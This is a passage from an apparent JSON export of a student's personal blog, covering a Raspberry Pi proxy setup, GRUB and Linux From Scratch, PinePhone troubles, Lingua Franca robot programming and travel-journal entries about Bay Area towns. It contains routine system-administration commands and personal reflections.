client.\n\nDownload the Arm-64 Linux Version, then use SCP to transfer it to the Raspberry Pi.\n\n## Initiate Clash\n\nTo start Clash, run the following command. This will initiate Clash using the specified configuration file.\n\n```bash\nclash -d . -f \"$config_file\"\n```\n\n## Switch Between Different Proxies\n\nTo switch between different proxies, we will utilize the Clash API. Follow these steps:\n\nFirst, create a script to list the available proxy servers from the configuration file. This script will extract the server names using awk.\n\n```bash\nservers=$(awk '/^  - name:/{print $3}' \"$config_file\" | tr -d '\"')\n\n```\n\nAfter listing the servers, you can switch the proxy server by making an API call to the Clash server(assuming port 9090)\n\n```bash\ncurl -X PUT -H \"Content-Type: application/json\" -d \"{\\\"name\\\":\\\"$server\\\"}\" http://localhost:9090/proxies/GLOBAL\n\n```\n\n## Set Proxy\n\nSave this as a file `set_proxy.sh` then do `source set_proxy.sh` (using bash `set_proxy.sh` doesn't work)\n\n```bash\nexport http_proxy=\"http://localhost:7890\"\nexport https_proxy=\"http://localhost:7890\"\nexport all_proxy=\"http://localhost:7890\"\n```\n\n## Trying basic commands\n\n```bash\necho 0 | sudo tee /sys/class/leds/ACT/brightness # Turn off LED\necho 1 | sudo tee /sys/class/leds/ACT/brightness # Turn on LED\necho $(($(cat /sys/class/thermal/thermal_zone0/temp)/1000))\u00b0C # Show temperatures\n```\n\n## Transfering Files\n\n```bash\nscp <filename> pi@10.40.88.225:/home/pi/\n```\n\n## Playing Music\n\nI can move mp3 files into the Rasp Pi OS then use cvlc, then listen with a earphone for example\n\n```bash\ncvlc \"yt1s.com - \u0411\u04382  \u041c\u043e\u043b\u0438\u0442\u0432\u0430 OST \u041c\u0435\u0442\u0440\u043e.mp3\"\n```\n\nI can adjust volumes with `alsamixer`\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8deb0"}, "title": "Grub Bootloader and Exploring LFS", "date": {"$date": "2023-10-14T00:08:00Z"}, "type": "linux", "access": 1, "body": "## What is Grub?\n\nSo grub is basically a bootloader to start the system. The point here is\nI\\'ve been using grub for almost a year now without a deep\nunderstanding.\n\nGrub boots the system by using grub shell. Grub starts from EFI system\npartition.\n\n## Config\n\nThere is a configuration file `/boot/grub/grub.cfg` that specifies the\nentry I see when the computer first starts. There is also timeout,\ndefault entry.\n\nMy grub config looks like this\n\n```cfg\nset timeout=1\n\nmenuentry \"Arch Linux\"{\n    linux   /vmlinuz-linux root=/dev/nvme0n1p3\n    initrd  /initramfs-linux.img\n}\n```\n\n## Config through Grub\n\nRun `sudo update-grub` on Ubuntu, or\n`sudo grub-mkconfig -o /boot/grub/grub.cfg` on Arch, that shall generate\nthe grub file.\n\nAlso `os-prober` is interesting tool to detect the partitions.\n\nBut I just manually configured everything.\n\n## What if Grub has errors?\n\nIf grub goes wrong, boot from a live usb, go to the partition, then\nchange the files in `/boot/grub/` directory, then it shall work right.\n\nAlternatively, I can boot from grub shell.\n\n## `/boot` Parition\n\nThis partition stores linux kernel.\n\n```sh\nmount /dev/nvme0n1p1 /mnt\nls /mnt\n```\n\nI get\n\n```output\nEFI  grub  initramfs-linux-fallback.img  initramfs-linux.img  vmlinuz-linux\n```\n\n## Backup\n\nIt is always a good idea to backup the grub.cfg since without grub(if\nyou don\\'t have alternative bootloaders).\n\n## Booting from Grub Shell\n\nThe entries in grub is not needed and I can just boot from grub shell.\n\nI can run\n\n```grub\nlinux (hd0,gpt1)/vmlinuz-linux root=/dev/nvme0n1p3\ninitrd (hd0,gpt1)/initramfs-linux.img\nboot\n```\n\n## Different Kernels\n\nAlso kernels sometimes have the same name, e.g.\u00a0`vmlinuz-lts`,\n`vmlinuz-virt`, they are different from one distro to the other.\nPointing different distros(I tried Alpine and Arch pointing to the same\nkernel) will have many bugs, for example, the touchpad won\\'t respond,\nthe wifi won\\'t load.\n\nI can put the kernel either in `/boot` partition or the ext4 partition.\n\n## Exploring LFS\n\nSo basically after trying out a few distributions I wanted to try\nsomething else, and there is Linux From Scratch.\n\nIt is basically building a linux environment in a separate disk\npartition.\n\nThere is a handbook, and I followed the handbook closely with ChatGPT\nexplaining some stuff.\n\nIt is just a lot of copy pasting code from the handbook to execute in\nterminal.\n\n## Basic Steps\n\n- Creating and formatting partition\n- Installing Temporary Tools\n- Chroot into it and Installing Packages\n- System Configuration\n\nThe first parts are very straightforward, and installing packages took a\nlong time.\n\n## Problems\n\nAfter installing the kernel, the system doesn\\'t boot. So I pointed the\nkernel to Arch Linux(my host system)\\'s kernel and it booted, but with\nsome errors and warnings. It can not find wireless interface and only\nreturned `lo` when I run `ip link`\n\n## BLFS packages\n\nThere are many packages depending on each other so installing something\nis really hard. For example, the Gnome Desktop have a million\ndependencies, and after a while I run out of patience trying to install\nthem, so I thought no gui good enough.\n\nWithout the kernel properly configured, I don\\'t think there is much\npoint in gui anyways, and you don\\'t need a gui for computer to\nfunction.\n\n## No Package Manager\n\nWithout package manager, I need to manually build every package. LFS\nbook specifies how to build many packages and I thought I would run into\nmany more bugs if I am to build them myself.\n\n## Conclusion\n\nSo after all, I would still use Arch Linux(and a little Ubuntu), and LFS\nis just a fun project, and hopefully I did understand something more\nabout the system.\n\nI am very grateful for LFS community, and registered my name in their\nwebsite, and I appreciate and would stick to open source."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8deb1"}, "title": "The Unsuccessful and Frustrating Journey of Exploring PinePhone ", "date": {"$date": "2023-09-28T00:38:00Z"}, "type": "linux", "access": 1, "body": "## Why\n\nSo I want to try linux on my phone, and last week I couldn\\'t unlock the\nandroid phone, so I bought a PinePhone since it is quite cheap.\n\n## Booting\n\nThe phone boots into Manjaro OS, and uses KDE Plasma.\n\n## Problem\n\n1.  GUI Problem\n\nSometimes the screen become too small vertically(without adjustments),\nand I couldn\\'t see all of the display.\n\nFor example gedit couldn\\'t save files since the save button is out of\nscreen.\n\n2.  Wifi Problem\n\nSince the wifi in settings has a pretty bad GUI, I couldn\\'t connect to\nwifi through settings, but had to connect to wifi through command line.\n\n3.  App Problem\n\nMany apps would suddenly shut down when I am using them, even like gnome\nsettings.\n\n4.  Boot Problem\n\nAfter I run `sudo pacman -Syu` the phone won\\'t boot, complaining about\nrtu. I couldn\\'t boot into recovery mode by holding volume and power.\n\n5.  Microsd Read Problem\n\nAt the afternoon of the second day I bought the phone, it wouldn\\'t read\nthe microsd I plugged in, saying card error, so I couldn\\'t boot\nanything into the phone.\n\n6.  Keyboard Problem\n\nIn terminal I need \\\"ctrl\\\", which isn\\'t in the keyboard normally. When\nI first entered the terminal the ctrl key was there but then if I press\nanywhere else the ctrl key disappears and I had to enter terminal again.\n\nEach of those problems cost me a long time, and I do not know how to\nsolve them(for real).\n\n## Sliding the Sim card inside\n\nSo I tried putting my sim card inside PinePhone but it wouldn\\'t go in,\nso I slide it inside, and it couldn\\'t come out.\n\n## Going to the Repair Store\n\nSo I went to the Repair store, hoping they would try to set up PinePhone\nfor me, but they said they didn\\'t support the type of phone.\nFortunately they got my sim card out, so i was thankful.\n\n## What did I do?\n\n### Booting Arch Linux from microsd\n\nSince the phone wouldn\\'t boot after I run update last night, this\nmorning I went to Albany to buy a microsd, and then boot a jumpdrive\ninto the microsd, then write the Arch Linux image with Phosh into the\nPinePhone. Everything was good and the phone booted into Arch.\n\nI used Ubuntu mostly and I am not entirely familiar with Arch. I went to\nthe command line and tried some, and fortunately it worked. However, I\ncouldn\\'t connect to the wifi.\n\n### Connecting to the Wifi\n\nI tried the gnome setting but the gnome setting would quit every few\nseconds for no reason. So I tried connecting to wifi from command line.\nI tried `nmtui` but it didn\\'t support the Berkeley Eduroam Internet.\nAlso the wifi couldn\\'t discover my phone\\'s hotspot.\n\nThen I tried `nmcli`\n\n```bash\n#!/bin/bash\n\nsudo nmcli con add con-name 'BerkeleyEduroam' \\\nifname wlan0 \\\ntype wifi \\\nssid 'eduroam' \\\nwifi-sec.key-mgmt wpa-eap \\\n802-1x.eap peap \\\n802-1x.identity 'jimchen@berkeley.edu' \\\n802-1x.password '<password>' \\\n802-1x.phase2-auth mschapv2\n```\n\nI had to manually type those commands myself and they lead to many\nerrors. I couldn\\'t even use gedit.\n\nAnyways, after that at school the Arch PinePhone would connect to school\nInternet.\n\n### Tried Openssh\n\nThe openssh didn\\'t work on the phone no matter how hard I tried, the\ncomputer just couldn\\'t detect the phone. I changed the ssh config and\nallowed root login `/etc/ssh/sshd_config`\n\nbut my computer couldn\\'t detect the phone while on the same network.\n\n### Pacman Update Error\n\nThen I tried updating the phone and installing other things but it would\nalways return `error:GPGmE error: no data`\n\nI tried\n\n```bash\nsudo rm -r /etc/pacman.d/gnupg\nsudo pacman-key --init\nsudo pacman-key --populate archlinux\n```\n\nBut it didn\\'t work. It would encounter same error all over again.\n\n### Tried Downloading Ngrok\n\nI thought if I could connect through Ngrok to my computer everything\nwill be easy. However, there wasn\\'t any wget, and when I tried to\n\n```sh\ncurl -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.tgz\n```\n\nIt says the source couldn\\'t be validated, and it couldn\\'t be\ndownloaded.\n\nSo in the end it is practically the same like without Internet since I\ncouldn\\'t do anything except curl html elements on a specific website.\n\nFirefox didn\\'t work because it said profile didn\\'t find, and there was\nthe nasty GUI problem where all buttons got out of screen.\n\n### Tried to boot Ubuntu Touch\n\nSo I tried to boot Ubuntu Touch into the Microsd card, but the phone\nwouldn\\'t read the microsd card when it boots, and after about 50\nseconds it would switch back to Arch. At this point the jumpdrive\ndidn\\'t work too.\n\n## Feeling Disappointed\n\nLaptop Linux are so fun for me but I seemed to have a little problem\nwith mobile Linux. I am very sad I achieved almost nothing today, and\nspent all my time over this crappy little device.\n\nI could practically do nothing on the system now, so maybe I will try to\nbuy another microsd card and try booting from there, and hopefully\nUbuntu Touch will work out, since I am much more familiar with Ubuntu.\n\n## Should I Still Using IOS\n\nThen I thought whether should I keep use IOS. And that is a very\ninteresting question. To be honest if Linux distros works out fully good\nfor me I would not use IOS, but again the PinePhone is cheap and\nfunctions much worse(as I heard) than either Android or IOS. The pricer\nLinux phones are Librem 5 which is like 1000 dollars, almost as\nexpensive as a new high-computation laptop(like the system76 I just\nbought). I thought it hilarious to buy a phone with such a price. Then\nagain, Linux are meant to be cheaper and more functional and more\ncustomizable, instead of expensive and hard to use. Moreoever, the\nPinePhone ran into a million bugs, which I couldn\\'t fix even in one\nwhole day, and that is before it even have basic functions.\n\nEven if the PinePhone is fully set up it would still be not even half as\ngood as IOS speaking of funtionality.\n\n## Why is IOS not comfortable?\n\nIf only IOS allow more customization I wouldn\\'t even think of this in\nthe first place.\n\nFirst: the app store. Even though it has enough apps I still want to\ninstall apps myself instead of through app store.\n\nSecond: the desktop. I want to customize it to run like gnome or lxde\nbut it wouldn\\'t let me customize the desktop.\n\nThird and most importantly, there is no command line in IOS, which like\nyou cannot know anything about the phone, which is very sad. It feels\nlike living in someone else\\'s house and the phone doesn\\'t seem to\nbelong to me 100%.\n\nIt is not that I hate IOS or something, unlike Windows, which I hate so\nmuch. I am just a obsessed Linux fanatic.\n\nIt\\'s not like I can do anything about my personality, if I could then I\nprobably wouldn\\'t be the one I am right now.\n\nSo yeah I thought I would still use IOS, which is kind of sad. The\nPinePhone didn\\'t come as I had expected to be, although I think I\nshould adjust my expectation for such a cheap phone anyways.\n\n## What to do in Future with PinePhone\n\nEven if I don\\'t use PinePhone primarily I could still use it for fun\noccasionally, like connect my computer terminal to it and run some\nprograms on PinePhone(for example, computer virus, since I don\\'t care\nabout it anyways). It seems a good virtual machine. I can also use it on\nsome occasions if there isn\\'t demanding tasks, like only calling and\nmessaging, at least it has more functions than my Philip Senior Citizen\nPhone.\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8deb2"}, "title": "Pololu Robot and Lingua Franca", "date": {"$date": "2023-09-23T01:28:00Z"}, "type": "other", "access": 1, "body": "This post describes my journey with Pololu Robot and Lingua Franca\nlanguage.\n\n## Why?\n\nSo this semester I am taking embedded systems (because I had been\npractically declined from all other classes I am interested in and OS is\ntoo much work), and they use Pololu Robot and Lingua Franca, that\\'s why\nI am learning them.\n\n## What?\n\nThe class uses Pololu Robot RP2040 3pi+, and I need to connect a wire to\nthe robot and run programs on my computer to make it execute stuff.\n\nI bought the robot for 200 dollars since I was very curious, and didn\\'t\nwant to work not only in the labs but also work at home.\n\nLingua Franca is a little like React Nodejs to be honest, and when I\nfirst started with React I was very bad (I still wasn\\'t really good at\nit), like it have all those reactors and trigggers to make the program\nwork. But mostly is just C Program, which I am also very bad at. As a\nresult, I faced obstacles and bugs at the start of the course, making me\nweary and sad indeed.\n\nBut mostly it was because I am too stupid, and also I wasn\\'t working\nhard enough.\n\n## ChatGPT\n\nLingua Franca is a new and not so widely-used language, so ChatGPT have\nlimited abilities(unlike C or Python or Javascript), but it is still\nvery good in generating code. The only difference is that you have to\nmanually debug with GPT\\'s generation.\n\n## Printf\n\nSo basically I had a really hard time making the printf statements in\nLingua Franca's work. At the end it turned out everything was fine except\nthat the manuel wan\\'t clear and the TA had limited experience.\n\nSo basically connect and make it bootsel mode (RP1-RP2 appearing in the\nmedia) and run\n\n```sh\nlfc src/[program].lf && picotool load -x bin/[program].elf -f\nsudo screen /dev/ttyACM0 115200\n```\n\nThe problem was I couldn\\'t find the ttyACM when connected, and it was\nbecause I hadn\\'t used picotool to load the program into the robot. And\nit took so long for TA to figure it out. But anyways it went fine.\n\n## Display\n\nFirst import the library.\n\n```c\nimport Display from \"lib/Display.lf\"\n```\n\nThen, use a New Display and set the line0\n\n```c\nd = new Display()\nreaction() -> d.line0 {=\n    static char buf0[17];\n    snprintf(buf0, 17, \"dsfasdfsadf\");\n    lf_set(d.line0, buf0);\n=}\n```\n\n## Logical time vs Physical Time\n\nLogical Time: In LF, logical time is used to order events in a\npredictable manner within the model, independent of the actual passage\nof real-world time. Physical Time: Physical time in LF is used when the\nthe model needs to interact with the physical world or external components\nthat operate in real-time.\n\nAlso, their types are different, and not specifying the right type, like\nld vs lld can cause problems. This is an example of correctly printing\nout\n\n```c\nint64_t x=lf_time_logical();\nint64_t y=lf_time_physical();\nprintf(\"Physical Action Triggered: Logical Time: %lld msec, Physical Time: %lld msec\\n\", x/1000000,y/1000000);\n```\n\nAn example code to demonstrate the difference\n\n```c\nmain reactor {\n  physical action tick\n\n  reaction(startup) -> tick {=\n    lf_schedule(tick, 0); // 1 second in nanoseconds\n  =}\n\n  reaction(tick) -> tick {=\n    int64_t logical_time = lf_time_logical();\n    int64_t physical_time = lf_time_physical();\n    printf(\"Function Enters: Logical Time: %lld msec, Physical Time: %lld msec\\n\",\n      logical_time / 1000000,\n      physical_time / 1000000);\n\n    while (lf_time_physical() < physical_time + 300000000);\n\n    int64_t logical_time_after = lf_time_logical();\n    int64_t physical_time_after = lf_time_physical();\n    printf(\"After Delay: Logical Time: %lld msec, Physical Time: %lld msec\\n\",\n      logical_time_after / 1000000,\n      physical_time_after / 1000000);\n\n    lf_schedule(tick, 1000000000); // Schedule the next occurrence of tick.\n  =}\n}\n```\n\nprints out\n\n```output\nFunction Enters: Logical Time: 3902 msec, Physical Time: 3902 msec\nAfter Delay: Logical Time: 3902 msec, Physical Time: 4202 msec\nFunction Enters: Logical Time: 5202 msec, Physical Time: 5203 msec\nAfter Delay: Logical Time: 5202 msec, Physical Time: 5503 msec\nFunction Enters: Logical Time: 6503 msec, Physical Time: 6503 msec\nAfter Delay: Logical Time: 6503 msec, Physical Time: 6803 msec\nFunction Enters: Logical Time: 7803 msec, Physical Time: 7803 msec\nAfter Delay: Logical Time: 7803 msec, Physical Time: 8103 msec\nFunction Enters: Logical Time: 9103 msec, Physical Time: 9103 msec\n```\n\n## Input and Output\n\nWe can get input basically from the output of another reactor, and then\nspecifying the output to input, for example, below is a code that passes\nx and y to the Destination reactor, then outputs the sum. Write\n`s.x -> d.x` to pass it.\n\n```c\nreactor Source {\n  output x: int\n  timer t(0, 1 sec)\n\n  reaction(t) -> x {=\n    lf_set(x,1);\n  =}\n}\n\nreactor Destination {\n  input x: int\n\n  reaction(x) {=\n    if (x->is_present) {\n      printf(\"Received %d.\\n\", x->value);\n    }\n  =}\n}\n\nmain reactor {\n  s = new Source()\n  d = new Destination()\n  s.x -> d.x\n}\n```\n\n### Mutable Input and Arrays\n\nSo input is usually not mutable, but we can set it. Below is an example\nof modifying array\n\n```c\nreactor Source {\n  output data: int[10]\n  timer t(0, 1 sec)\n  reaction(t) -> data {=\n    for(int i = 0; i < 10; i++) {\n        data->value[i] = i;\n    }\n    lf_set_present(data); // Notify that the output data is set\n  =}\n}\n\nreactor Processor {\n  mutable input data: int[10]\n  reaction(data) {=\n    if(data->is_present) {\n        for(int i = 0; i < 10; i++) {\n            printf(\"%d \", data->value[i]);\n        }\n        //0 1 2 3 4 5 6 7 8 9\n\n        // Modify the mutable input directly\n        for(int i = 0; i < 10; i++) {\n            data->value[i] += 2023;\n        }\n\n        for(int i = 0; i < 10; i++) {\n            printf(\"%d \", data->value[i]);\n        }\n        //2023 2024 2025 2026 2027 2028 2029 2030 2031 2032\n    }\n  =}\n}\n\nmain reactor {\n  src = new Source()\n  proc = new Processor()\n\n  src.data -> proc.data\n}\n```\n\n## Robot Going in a Square\n\nSo after a while, I wrote a program to make the robot go in a square. \n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8deb3"}, "title": "End of Semptember 2023: Trips", "date": {"$date": "2023-09-19T20:02:00Z"}, "type": "journal", "access": 1, "body": "## 9.18 Visiting Oakland\n\nToday I went to Oakland.\n\n### Sleeping Schedule Problems\n\nThese days I am having sleeping schedule problems. I was completely out\nof sleeping control.\n\nI mean, I almost adjusted things to the right place this weekend, after\nsleeping and getting up normally at Saturday. Then my computer broke\ndown after purging libdev-dev, which was ChatGPT's advice for me to\ndebug, and I suffered a minor broke down too.\n\nWhen I was young it seemed like night was an end to a day, but now\nsometimes I just don't want to sleep at night.\n\nI would usually try staying up for 30 hours to adjust my schedule, but\nit would just bounce right back after a few days. I would often reach no\nanswers when pondering basic philosophical questions. And I thought\nagain and again my plan to move to north Europe or Alaska.\n\n### Thinking about Buying Another Computer\n\nLast night I was thinking about buying another computer to try on gentoo\nand possibly build lfs, since I don't want my computer to broke down\nagain. I need to use my computer on a daily basis and modifying the BIOS\nsettings and doing stuff may cause problems. I looked for laptops on\nAmazon but they are not satisfactory. I want to use the new pc to play\nwith maybe gentoo and arch and lfs and blfs.\n\nI don't need much of sound, voice, display resolution, touchscreen,\nmouse, operating system, additional keyboard features, much storage\nspace, any additional repairing stuff, or any crappy Microsoft services.\n\nI need a big screen(15.6 inch at least), high processing CPU and large\nRAM(at least 16gb), and no hardware problems.\n\nI tried searching on Amazon but it seems pretty expensive, and the\ncheaper ones are not trustworthy. Pinebook (220 dollars) seems fine\nexcept for it's 4gb ram, and in the end I thought System76 is a good\nchoice, but it was like around 1000 to 1500 dollars, a little too\nexpensive for me.\n\n### Going to Oakland\n\nI was fully frustrated and decided to go out to do something but try\nmake it short, and walked to Bart station. I stepped on the first Bart\nTrain that came, and it is going to San Francisco. I don't want to go to\nSan Francisco,so I decided to go to Oakland.\n\nI first got off the Bart train at West Oakland. West Oakland looked very\nrundown indeed, and the streets are ugly and dirty. There aren't a lot\nof people around.\n\n### 7th Street\n\nThen I tried walking along 7th street and went to Market Street, and it\nbegan to look much nicer. There is a school on Market Street and a KFC.\n\n### Eating in KFC\n\nThen I thought that I haven't seen any KFC here in US, but a lot of Mac\nDonald's. But KFC is very much popular is Shanghai indeed. And I was a\nlittle melancholy when I thought about Shanghai. Then I went in KFC to\neat.\n\nThe servant at KFC isn't very smart, and it took her a long time to\nunderstand what I am saying, and she couldn't get words straight. Also\nthe food is very expensive.\n\n### Melancholy and Thinking of Home\n\n```\n\u2026 Away from home, away from home\nAway from home, away from home\nLord, I'm five hundred miles away from home\n\u2026 Not a shirt on my back\nNot a penny to my name\nLord, I can't go back home this ole way\n\nWhen the seas and mountains fall\nAnd we come, to end of days\nIn the dark I hear a call\nCalling me there\nI will go there\nAnd back again\n```\n\n### Market Street\n\nThen I walked around Market Street and it was very nice, to the point\nwhere I wouldn't mind living here actually. There are some geese in a\npark, and the streets are lined with beautiful trees and wide pavement.\nThe houses are also pretty beautiful.\n\n### Homeless Camps\n\nThen I further walked north to 23rd street, and everything became dirty\nafter that point. There are a lot of homeless people camping right on\nthe streets, which disgusted me.\n\nThen I walked east to San Pablo Avenue, and it was so dirty. The streets\nare lined with homeless camps on San Pablo avenue, and smelled of pee\nand stink. I was very much annoyed indeed.\n\nThen I started running a little bit, and I run till Telegraph avenue.\nThere are a million homeless people on the streets along the way, and\nall garbage from clothes to dumped foods. There are people with obvious\nphysical problems standing in the middle of streets.\n\n### Downtown Oakland\n\nAfter walking a while on Telegraph Avenue things got better, and there\nare many tall buildings on each way, so I reckoned it was like downtown.\nIt is kind of like San Francisco, but the streets weren't clean.\n\n### Conclusion\n\nAnyways Oakland it not a good place I think. The west part of the Market\nstreet was decent, but overall this crappy place is so bad.\n\n## 9.19 Visiting Walnut Creek\n\n### Why\n\nYesterday I went to Oakland. Today I was still very much frustrated.\n\nI went to the Bart station and asked ChatGPT where to go, and it told me\nOrinda, Lafayette, Pleasanton or Walnut Creek. So I went to Walnut Creek\nby Bart.\n\n### Walnut Creek is Clean\n\nThe Bart train went up like the hills east of the Bay Area and I came to\nWalnut Creek.\n\nWalnut Creek is very clean, which is kind of satisfactory for me. I like\nclean places. There are no trash on the ground. Walnut Creek does look\naffluent.\n\nThere are many cars on the streets. I went to North Main Street, and\nthere is a target store. Then it was like almost 5 pm, and I decided to\neat some food as dinner/my breakfast.\n\n### Dinner/Breakfast\n\nI went into Lettuce Restaurant, and it was very clean and the waitress\nwas very nice. I ordered a sandwich and some donut, and they taste very\ngood. I paid like 16 dollars which was even cheaper than yesterday's\nstupid KFC.\n\nThe houses around are really beautiful, and I thought it must be pretty\nnice to live here. Everything is much better than dirty Berkeley or\nhomeless Oakland, as there are just no homeless people here. There are\nreally a lot of trees.\n\n### Civic Park and Regional Trail\n\nThen I kept walking to Civic street and went into Civic Park. There are\nso many big parking lots in Walnut Creek. I kept walking and there are\nmany dogs. I hate dogs and I turned around and walked back to the\nstreets.\n\nSo I walked towards the Iron Horse Regional Trail. The trail is well\nconstructed and there was an Intermediate school along the trail, and I\nwalked into the school. There are some girls kind of playing volleyball\nand some boys playing soccer. There is also a gym and there are more\npeople in the gym than outside, and I didn't remember what sports they\nare playing.\n\nI thought about doing school here and thought it pretty nice, but my\nmiddle school experience is very valuable too, and I thought how it made\nme who I am right now, caring so much about some things and being so\nsensitive, yet ignoring completely other non relevant things in life.\nAnyways it seems complicated and again Walnut Creek is very rich, my\nfamily probably couldn't afford anyways.\n\nThen I kept walking along the trail, and the small road across the trail\nlooked nice as there are many beautiful houses. People look better\ndressed than Berkeley too.\n\nThen I came to Pleasanton Hill Bart station and went home.\n\n### Conclusion\n\nIn conclusion, north California is a diverse place. I very much prefer\nWalnut Creek part and would like to visit it again. It is very clean,\nnot crowded, safe, and green.\n\n## 9.21 Visiting Emeryville\n\nToday I went to Emeryville.\n\n### Student Support\n\nI had some personal problems, then I went to the student support for my\nproblems and chatted a while. The man helping me was very nice and I was\ntouched.\n\n### BestBuy in Emeryville\n\nThen I took the bus F to Emeryville. I had wanted to buy a computer for\na while but was unsure about which to buy. I got off the bus at BestBuy\nand went in to take a look.\n\nAnyways, there are all kinds of computers in BestBuy, ranging in price.\nI tried some briefly, trying to restart while simultaneously pressing\nf12 del f2 and shift, and some have trouble booting into the BIOS mode.\nThere was this 4 gb ram computer, and I tried playing a YouTube video\nwith 2160p but it didn't work well, however there was this huge\nexpensive more than 2000 dollar gaming computer, and didn't play the\nYouTube 2160p video well too, so I reckoned it was like the Wi-Fi\nconnectivity problem. The command lines and power shell in windows do\nnot work. I reckoned I want 16:9 computer since my eyes' distance are\nlong. I also wanted it to be at least 15.6 inches.\n\nThen I was trying on a Vivobook, and I booted into BIOS easily, but it's\nmenu is quite strange, and I could even use the touchpad. Then I tried\nbooting Ubuntu, and it worked. However at that moment a worker came and\nsaid it is forbidden, and looked very much annoyed. So I ended up\nunplugging the usb, and after a while it boots into Windows again.\n\nThen I asked the worker which computer is best for Linux, and he said\ndirectly there are no Linux computers, and I thought he lacked basic\nknowledge. I thought like as a worker in a computer store you would at\nleast be familiar with computers, but like they actually know nothing.\n\nSo anyways I tried a MacBook, and I haven't tried Mac much before. I\ntried opening a terminal, but the worker came back at me and said\n\"programming\" is forbidden too. I thought I couldn't live 5 seconds\nwithout a terminal. Anyways I thought those workers are just as stupid\nlike those in ATT stores, and that they best work in other shops like\nclothing shops or Mac Donald's than work here, since they provide no\nknowledge of computers.\n\nThen I decided to buy a System76 computer since I do care about\nperformance, and as expensive as the computer is, it is half the price\nof a class in UC Berkeley. I don't want to waste money on a computer\nthat is hard to use.\n\n### Dinner at Chevys\n\nThen I started to dislike Best Buy a little and went out and walked a\nwhile. It became pitch dark, and I was a little afraid. Last night there\nwas a robbery at gunpoint at Berkeley, and I was always out there at 4\nor 5 am. But anyways, it is still early, and I wasn't going into any\nhomeless places.\n\nI crossed the bridge to the Bay, and went into Chevy for dinner. There\nis loud music playing, like, deafening, and people dancing. It is kind\nof fun but I do not like loud music much, so I went and sat on the\nopposite side of the loud music and people dancing, and it seemed\nbearable. I quickly ordered a chipotle. Then after a while no waitress\ncame to deliver food, and I went to ask them, but suddenly the waitress\nhanded the food bag in my hand, then I started to eat. Despite the loud\nmusic, the food is very delicious.\n\n### Emeryville Marina Park\n\nI realized I had been to Emeryville Marina Park only once, this January,\nand that I haven't been there ever since. It is dark at night, and\nseeing the waters far ahead seems like looking from a plane, with low\nlit lights scattered across the horizon.\n\n### Walking Along the Shore\n\nThen I turned north and started walking back to Berkeley along the\nshore. The road was dark, and along the highway, there was only me, the\nBay, the sky, and dim lights. It felt so isolated, kind of like how I\nfelt walking along Huangpu River but much more. The roads went on and\nthere weren't many people. The waves were softly pushing along the\nshores on my left.\n\nTime went fast as I walked along the highway, and I reached Point Emery\nin a fairly short period. There were some cars parked there and a few\npeople, who I couldn't see clearly from the dim lights. Then I walked\non. On my right was Aquatic Park, where I had been to like around 3 or 4\ntimes. But I had never been to the shoreline on the opposite side of\nAquatic Park since it is not easily accessible. I remembered walking on\nthe inside of the railroad to Emeryville but not outside of the\nrailroad, and I kept walking north.\n\nThe Bay at night was fascinating, and soon Emeryville Marina Park was\nnothing but some lights lined on the south of the horizon, and then the\nlights combined with the Bay Bridge and I couldn't distinguish between\nthem. 2 miles went by very quickly, and I saw the bridge to Berkeley\nPoint.\n\n### Taking Bus Home\n\nI remembered seeing some suspicious people on the bridge some days ago\nat night who were perhaps homeless. Anyways I did not cross the bridge\nbut kept on to McLaughlin Eastshore, and it was so dark I even felt a\nlittle afraid, but soon came to 51B bus station. Then I took the bus\nhome.\n\n### Conclusion\n\nIn conclusion, Emeryville is quite fun, and walking along the isolated\nshore at night alone is indeed a unique experience even for me who likes\nto wander around now and then.\n\n## 9.22 Visiting Lafayette\n\nToday I am going to Lafayette.\n\n### Emotional Problems and Lab\n\nLast night I faced some emotional problems again and couldn't get any\nsleep. I attended the lab in the morning. Now its evening and I am going\nto Lafayette.\n\nAnyways let's not talk about the disappointing stuff and go back to our\nvisit to Lafayette. I went to the Bart station, but it took 20 minutes\njust waiting for trains. Anyways, I hopped on a Bart and went to\nLafayette.\n\n### Dark and Creepy\n\nIt was almost 9 pm when I arrived and it was dark. When I went out of\nthe Bart station everything looked creepy, like I could just not see\nthrough the fences.\n\nThen I walked on Mount Diablo Blvd, and there are many stalls in the\nmiddle of the road. Many people are packing their stuff in their trucks.\nI reckon it was a street market closing up.\n\n### Dinner\n\nThen I walked east of Mount Diablo Blvd, and every street looked dimly\nlit. I tried to find dinner, and went into local kitchens and bought a\ntortilla and some chips for dinner, then I eat as I went around. The\nfood was very delicious.\n\nThe streets are literally so dark in Lafayette at night. As I started\nwalking towards the Lafayette creek on Moraga Blvd I couldn't see\nanything, as the only light was from some houses, so I turned back.\n\nThere wasn't much to see at night. I walked on Moraga Road and there was\nan elementary school. Then after that the street go so dark so I went to\nback to Mount Diablo Blvd.\n\n### Safeway\n\nThere was a Safeway on Mount Diablo Blvd so I went inside. There was\nthis watermelon cup, and buy 2 get 1 free thing. So I went and get 3. I\nalso got some oatmeals and stuff. Safeway was open 24 hours, and I\nthought it is so nice and looked it on map, then realized there is one\nvery near my home and I didn't even know that before.\n\nAnyways as I went out I realized that the watermelon cup is very large,\nand one is quite enough, and I had to carry 2 of them with me. So I\nthought shopping was kind of like leaky relu in machine learning, you\ndon't necessarily get more rewards with more budget.\n\nWhen I walked out of the supermarket I saw some people but realized they\nweren't homeless but normal people. And I thought Lafayette is like one\nof the affluent neighborhoods around here, so that isn't much surprising\nanyway.\n\n### Deciding to Go Back\n\nHowever no matter which way I walked, it is dark and creepy, and with\nfood I bought from Safeway to carry I could practically go nowhere.\nThere were still some cars in the streets though.\n\nThen I tried walking west on Mount Diablo Blvd.The people I saw when I\nfirst came out of the Bart Station were gone as well as their trucks. I\ncouldn't go half a mile before there were no light on the streets and I\ndecided to take the Bart back.\n\n### Conclusion\n\nIn conclusion, this is a somewhat unsuccessful journey, but there are\nalways ups and downs. I would probably try to plan more when visiting\nplaces at night, and choose populous places like San Francisco. Other\nthan that, the food is delicious and going to Lafayette was fun, and\nLafayette is a quiet, clean, and fine neighborhood.\n\n## 9.28 Visiting Orinda\n\nSo today I went to Orinda. The trip was postponed for 2 whole days.\nAnyways, I hopped on a Bart and went there.\n\n### Orinda Village\n\nI got off and went to Orinda Village. It was lovely village but rather\nsmall. The restaurants are closed at like 3 pm, but they would reopen at\n4 or 5 pm. Anyways I went to the library. The library was very nice and\ncomfortable, with free computer service and a 